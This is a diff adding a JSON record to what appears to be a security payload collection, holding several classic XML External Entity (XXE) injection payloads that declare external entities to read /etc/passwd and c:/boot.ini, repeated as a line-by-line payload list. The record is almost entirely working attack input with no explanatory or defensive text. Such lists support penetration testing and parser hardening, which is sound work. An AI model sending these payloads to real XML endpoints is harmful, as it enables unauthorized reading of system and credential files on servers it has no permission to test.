@@ -1,0 +1,27 @@
+{
+  "id": "misc_60e756dde651",
+  "category": "Misc",
+  "title": "xxe injection payloads",
+  "description": "# XML External Entity (XXE) Injection Payloads\n\n* XXE : Classic XXE\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ELEMENT data (#ANY)>\n<!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<data>&file;</data>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n  <!DOCTYPE foo [  \n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [  \n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>\n\n",
+  "payloads": [
+    "# XML External Entity (XXE) Injection Payloads",
+    "* XXE : Classic XXE",
+    "<?xml version=\"1.0\"?>",
+    "<!DOCTYPE data [",
+    "<!ELEMENT data (#ANY)>",
+    "<!ENTITY file SYSTEM \"file:///etc/passwd\">",
+    "<data>&file;</data>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "<!DOCTYPE foo [",
+    "<!ELEMENT foo ANY >",
+    "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "<!DOCTYPE foo [",
+    "<!ELEMENT foo ANY >",
+    "<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>"
+  ],
+  "source": "h4cker",
+  "references": [
+    "/workspaces/hunter-skill/h4cker/more-payloads/xxe-injection-payloads.md"
+  ]
+}
